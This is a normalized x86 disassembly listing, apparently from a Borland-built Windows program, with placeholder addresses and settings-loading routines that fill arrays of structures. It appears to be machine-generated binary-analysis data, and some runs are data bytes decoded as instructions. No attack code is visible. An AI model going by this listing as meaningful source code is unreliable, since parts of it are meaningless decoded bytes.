mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
sub_40f933
inc [ ebx ]
add [ eax ] al
add [ eax + eax ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x7 ] bh
inc eax
add [ ecx ] al
add [ eax + eax + 0x54 ] al
dec edx
outsd
jns r-xdata
test [ 0x45f6000c ] ebp
or al 0x1
jne r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
call sub_4b0180
pop ecx
add [ rw-data ] 0x1
jb r-xdata
je @@Joystick@Finalize
pop ebp
retn
pop ebp
retn
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push edi
or eax [ eax ]
test ebx ebx
je r-xdata
inc eax
add [ eax + eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
je r-xdata
dec [ ebp - 0x8 ]
lea esi [ ebx + 0x3c ]
dec [ ebp - 0x8 ]
xor edx edx
mov eax esi
call sub_4d2728
test [ ebp + 0xc ] 0x1
sub_40f9e0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
push sub_40fa7c
push 0x1
push sub_40fa34
push 0x1
push 0x10
push 0x1a90
mov edx [ ebp + 0x8 ]
add edx 0x8
push edx
call sub_4c3d98
add esp 0x1c
add [ ebp - 0x8 ] 0xcd0
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_40fa34
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
push r-xdata
push 0x1
push sub_40d690
push 0x3
push 0x44
push 0x64
push ebx
call sub_4c3d98
add esp 0x1c
add [ ebp - 0x8 ] 0xcc
mov eax ebx
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa7c
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
add [ ebp - 0x8 ] 0xffffff34
push r-xdata
push 0x1
push 0x44
push 0x64
push ebx
call sub_4c3c38
add esp 0x14
test [ ebp + 0xc ] 0x1
je r-xdata
push ebx
call sub_4b0180
pop ecx
sub_40fae8
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0xcd0
mov edx [ ebp + 0x8 ]
test edx edx
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
add [ ebp - 0x8 ] 0xfffff330
push sub_40fa7c
push 0x1
push 0x10
push 0x1a90
mov ecx [ ebp + 0x8 ]
add ecx 0x8
push ecx
call sub_4c3c38
add esp 0x14
test [ ebp + 0xc ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4b0180
pop ecx
sub_40fb50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
xor ebx ebx
imul edi ebx 0x1a90
add edi esi
add edi 0x8
push edi
call sub_40fbb8
pop ecx
push edi
call sub_40fbe0
pop ecx
inc ebx
cmp ebx 0x10
jl r-xdata
mov [ esi + 0x4 ] 0x2
xor eax eax
xor edx edx
mov [ esi + 0x1a908 ] eax
xor ecx ecx
mov [ esi + 0x1a90c ] 0x0
mov [ esi + 0x1a90d ] 0x0
mov [ esi + 0x1a910 ] edx
mov [ esi + 0x1a914 ] ecx
xor eax eax
mov [ esi + 0x1a918 ] eax
mov [ esi ] 0x1
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40fbb8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax ebx
shl eax 0x2
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
add eax esi
call sub_40dd18
inc ebx
cmp ebx 0x44
jl r-xdata
pop esi
pop ebx
pop ebp
retn
sub_40fbe0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax ebx
shl eax 0x2
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
add eax esi
call sub_40d6f0
inc ebx
cmp ebx 0x44
jl r-xdata
pop esi
pop ebx
pop ebp
retn
sub_40fc08
push ebp
mov ebp esp
add esp 0xfffffe80
mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x128 ] 0x2
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_4d2618
inc [ ebp - 0x128 ]
inc [ ebp - 0x128 ]
mov [ ebp - 0x134 ] 0xc
push esi
call sub_40fb50
pop ecx
xor edx edx
mov [ ebp - 0x134 ] 0x18
mov [ ebp - 0x4 ] edx
lea edx [ ebp + 0xc ]
lea eax [ ebp - 0x4 ]
call sub_41e604
lea ecx [ ebp - 0x4 ]
mov dl 0x1
inc [ ebp - 0x128 ]
mov eax [ r-xdata ]
mov ecx [ ecx ]
call sub_405948
mov [ ebp - 0x148 ] eax
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
push 0x0
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x8 ]
push ecx
mov [ ebp - 0x134 ] 0x24
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov [ ebp - 0x14c ] eax
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x134 ] 0xc
mov ecx [ ebp - 0x14c ]
cmp ecx 0x1e
jge r-xdata
push 0x2
mov edx rw-data
lea eax [ ebp - 0x1c ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x18 ]
push ecx
mov [ ebp - 0x134 ] 0x54
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x14c ]
cmp ecx 0x2c
jge r-xdata
mov eax [ ebp - 0x148 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x14 ]
test edx edx
je r-xdata
push 0x0
mov edx rw-data
lea eax [ ebp - 0x34 ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x30 ]
push ecx
mov [ ebp - 0x134 ] 0x84
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov [ esi + 0x1a908 ] eax
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
push 0x0
mov edx rw-data
lea eax [ ebp - 0x24 ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x134 ] 0x6c
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov [ ebp - 0x14d ] al
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x134 ] 0x60
push 0x0
mov edx rw-data
lea eax [ ebp - 0x2c ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x134 ] 0x78
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov [ ebp - 0x14e ] al
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x134 ] 0x60
mov cl [ ebp - 0x14d ]
test cl cl
je r-xdata
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp + 0xc ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x144 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x134 ] 0x48
mov edx 0x3
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x134 ] 0x30
mov ecx [ esi + 0x4 ]
mov eax [ ebp - 0x154 ]
cmp ecx eax
jg r-xdata
mov al [ ebp - 0x14e ]
test al al
je r-xdata
mov [ esi + 0x1a908 ] 0x3
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x134 ] 0xd8
mov eax [ ebp - 0x154 ]
xor edx edx
inc eax
mov [ ebp - 0x158 ] eax
mov [ ebp - 0x64 ] edx
inc [ ebp - 0x128 ]
lea eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x158 ]
push ecx
push rw-data
push eax
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x64 ]
inc [ ebp - 0x128 ]
xor ecx ecx
mov [ ebp - 0x60 ] ecx
inc [ ebp - 0x128 ]
lea ecx [ ebp - 0x60 ]
inc [ ebp - 0x128 ]
mov eax rw-data
call sub_402d5c
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x64 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x134 ] 0xcc
mov [ ebp - 0x134 ] 0xcc
xor ebx ebx
mov edx [ ebp - 0x148 ]
mov [ ebp - 0x120 ] edx
mov ecx [ ebp - 0x120 ]
test ecx ecx
je r-xdata
xor edx edx
mov [ esi + 0x1a908 ] edx
mov [ esi + 0x1a908 ] 0x1
jmp r-xdata
mov [ ebp - 0x134 ] 0xc
jmp r-xdata
lea eax [ ebx + 0x1 ]
lea edx [ ebp - 0x180 ]
push eax
push rw-data
push edx
call sub_4c8520
mov [ ebp - 0x134 ] 0xe4
add esp 0xc
mov edx rw-data
lea eax [ ebp - 0x70 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x74 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0x74 ] eax
push edx
lea edx [ ebp - 0x180 ]
inc [ ebp - 0x128 ]
lea eax [ ebp - 0x6c ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x60 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x68 ]
call sub_41e604
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x148 ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x74 ]
lea eax [ ebp - 0x78 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x128 ]
inc [ ebp - 0x128 ]
lea eax [ ebp - 0x78 ]
mov ecx ebx
add ecx ecx
mov edx [ eax ]
imul eax [ ebp - 0x154 ] 0x1a90
shl ecx 0x2
add eax esi
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + ecx * 4 ]
add eax ecx
add eax 0x8
call sub_40daa4
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x78 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x6c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_4d318c
lea ecx [ ebx + 0x1 ]
lea eax [ ebp - 0x180 ]
push ecx
push rw-data
push eax
call sub_4c8520
mov [ ebp - 0x134 ] 0xf0
add esp 0xc
mov edx rw-data
lea eax [ ebp - 0x84 ]
call sub_4d3010
inc [ ebp - 0x128 ]
xor ecx ecx
mov edx [ eax ]
lea eax [ ebp - 0x88 ]
push edx
mov [ ebp - 0x88 ] ecx
push eax
lea eax [ ebp - 0x80 ]
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x180 ]
call sub_4d3010
inc [ ebp - 0x128 ]
xor ecx ecx
mov edx [ eax ]
lea eax [ ebp - 0x7c ]
push edx
lea edx [ ebp - 0x60 ]
mov [ ebp - 0x7c ] ecx
call sub_41e604
lea ecx [ ebp - 0x7c ]
inc [ ebp - 0x128 ]
mov edx [ ecx ]
mov eax [ ebp - 0x148 ]
pop ecx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x88 ]
lea eax [ ebp - 0x8c ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x128 ]
inc [ ebp - 0x128 ]
lea eax [ ebp - 0x8c ]
mov ecx ebx
add ecx ecx
mov edx [ eax ]
imul eax [ ebp - 0x154 ] 0x1a90
shl ecx 0x2
add eax esi
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + ecx * 4 ]
add eax ecx
add eax 0x6c
call sub_40daa4
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x8c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x88 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x84 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x80 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x7c ]
mov edx 0x2
call sub_4d318c
inc ebx
cmp ebx 0x8
jl r-xdata
mov ecx [ ebp - 0x14c ]
cmp ecx 0x2b
jge r-xdata
mov [ esi ] 0x0
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp + 0xc ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x144 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x120 ]
mov edx [ eax ]
mov [ ebp - 0x11c ] edx
mov [ ebp - 0x134 ] 0x168
mov edx 0x3
mov eax [ ebp - 0x120 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x134 ] 0x150
push 0x0
mov edx rw-data
lea eax [ ebp - 0x3c ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x38 ]
push ecx
mov [ ebp - 0x134 ] 0x90
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov [ esi + 0x1a90c ] al
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
push 0x0
mov edx rw-data
lea eax [ ebp - 0x44 ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x40 ]
push ecx
mov [ ebp - 0x134 ] 0x9c
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov [ esi + 0x1a90d ] al
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x44 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4d318c
push 0x0
mov edx rw-data
lea eax [ ebp - 0x4c ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x48 ]
push ecx
mov [ ebp - 0x134 ] 0xa8
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov [ esi + 0x1a910 ] eax
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_4d318c
push 0x0
mov edx rw-data
lea eax [ ebp - 0x54 ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x50 ]
push ecx
mov [ ebp - 0x134 ] 0xb4
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov [ esi + 0x1a914 ] eax
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x54 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x50 ]
mov edx 0x2
call sub_4d318c
push 0x0
mov edx rw-data
lea eax [ ebp - 0x5c ]
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x58 ]
push ecx
mov [ ebp - 0x134 ] 0xc0
call sub_4d3010
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax [ ebp - 0x148 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov [ esi + 0x1a918 ] eax
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x5c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x58 ]
mov edx 0x2
call sub_4d318c
xor ecx ecx
mov [ ebp - 0x154 ] ecx
mov [ ebp - 0x134 ] 0xc
jmp r-xdata
xor eax eax
mov [ ebp - 0x160 ] eax
mov [ ebp - 0x134 ] 0xcc
mov edx [ ebp - 0x160 ]
cmp edx 0x2
jge r-xdata
xor eax eax
mov [ ebp - 0x15c ] eax
mov [ ebp - 0x134 ] 0xcc
mov edx [ ebp - 0x15c ]
cmp edx 0x2
jge r-xdata
mov [ ebp - 0x134 ] 0x114
mov edx rw-data
lea eax [ ebp - 0xc0 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0xc4 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xc4 ] eax
push edx
mov edx rw-data
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xbc ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x60 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xb8 ] eax
lea eax [ ebp - 0xb8 ]
call sub_41e604
inc [ ebp - 0x128 ]
lea edx [ ebp - 0xb8 ]
mov eax [ ebp - 0x148 ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0xc4 ]
lea eax [ ebp - 0xc8 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xc8 ]
inc [ ebp - 0x128 ]
mov edx [ eax ]
imul ebx [ ebp - 0x154 ] 0x1a90
add ebx esi
mov eax ebx
add eax 0xc88
call sub_40daa4
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xc8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xc4 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xc0 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xbc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xb8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x134 ] 0x120
mov edx rw-data
lea eax [ ebp - 0xd4 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0xd8 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xd8 ] eax
push edx
mov edx rw-data
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xd0 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x60 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xcc ] eax
lea eax [ ebp - 0xcc ]
call sub_41e604
inc [ ebp - 0x128 ]
lea edx [ ebp - 0xcc ]
mov eax [ ebp - 0x148 ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0xd8 ]
lea eax [ ebp - 0xdc ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xdc ]
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax ebx
add eax 0xcec
call sub_40daa4
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xdc ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xd8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xd4 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xd0 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xcc ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x134 ] 0x12c
mov edx rw-data
lea eax [ ebp - 0xe8 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0xec ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xec ] eax
push edx
mov edx rw-data
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xe4 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x60 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xe0 ] eax
lea eax [ ebp - 0xe0 ]
call sub_41e604
inc [ ebp - 0x128 ]
lea edx [ ebp - 0xe0 ]
mov eax [ ebp - 0x148 ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0xec ]
lea eax [ ebp - 0xf0 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xf0 ]
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax ebx
add eax 0xd50
call sub_40daa4
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xf0 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xec ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xe8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xe4 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xe0 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x134 ] 0x138
mov edx rw-data
lea eax [ ebp - 0xfc ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x100 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0x100 ] eax
push edx
mov edx rw-data
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xf8 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x60 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xf4 ] eax
lea eax [ ebp - 0xf4 ]
call sub_41e604
inc [ ebp - 0x128 ]
lea edx [ ebp - 0xf4 ]
mov eax [ ebp - 0x148 ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x100 ]
lea eax [ ebp - 0x104 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x128 ]
lea eax [ ebp - 0x104 ]
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov eax ebx
add eax 0xdb4
call sub_40daa4
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x104 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x100 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xfc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xf8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xf4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x134 ] 0xcc
xor ebx ebx
mov [ ebp - 0x134 ] 0xcc
xor ebx ebx
mov [ ebp - 0x134 ] 0xcc
xor ebx ebx
lea eax [ ebx + 0x1 ]
lea edx [ ebp - 0x180 ]
push eax
push rw-data
push edx
call sub_4c8520
mov [ ebp - 0x134 ] 0x144
add esp 0xc
mov edx rw-data
lea eax [ ebp - 0x110 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x114 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0x114 ] eax
push edx
lea edx [ ebp - 0x180 ]
inc [ ebp - 0x128 ]
lea eax [ ebp - 0x10c ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x60 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0x108 ] eax
lea eax [ ebp - 0x108 ]
call sub_41e604
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x108 ]
mov eax [ ebp - 0x148 ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x114 ]
lea eax [ ebp - 0x118 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x128 ]
inc [ ebp - 0x128 ]
lea eax [ ebp - 0x118 ]
mov ecx ebx
shl ecx 0x2
mov edx [ eax ]
imul eax [ ebp - 0x154 ] 0x1a90
lea ecx [ ecx + ecx * 4 ]
add eax esi
lea ecx [ ecx + ecx * 4 ]
add eax ecx
add eax 0xe18
call sub_40daa4
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x118 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x114 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x110 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x10c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x108 ]
mov edx 0x2
call sub_4d318c
inc ebx
cmp ebx 0x20
jl r-xdata
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x60 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x134 ] 0xc
inc [ ebp - 0x154 ]
lea eax [ ebx + 0x1 ]
lea ecx [ ebp - 0x180 ]
push eax
mov edx [ ebp - 0x160 ]
inc edx
push edx
push rw-data
push ecx
call sub_4c8520
mov [ ebp - 0x134 ] 0x108
add esp 0x10
mov edx rw-data
lea eax [ ebp - 0xac ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0xb0 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xb0 ] eax
push edx
lea edx [ ebp - 0x180 ]
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xa8 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x60 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xa4 ] eax
lea eax [ ebp - 0xa4 ]
call sub_41e604
inc [ ebp - 0x128 ]
lea edx [ ebp - 0xa4 ]
mov eax [ ebp - 0x148 ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0xb0 ]
lea eax [ ebp - 0xb4 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x128 ]
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xb4 ]
mov ecx [ ebp - 0x160 ]
shl ecx 0x3
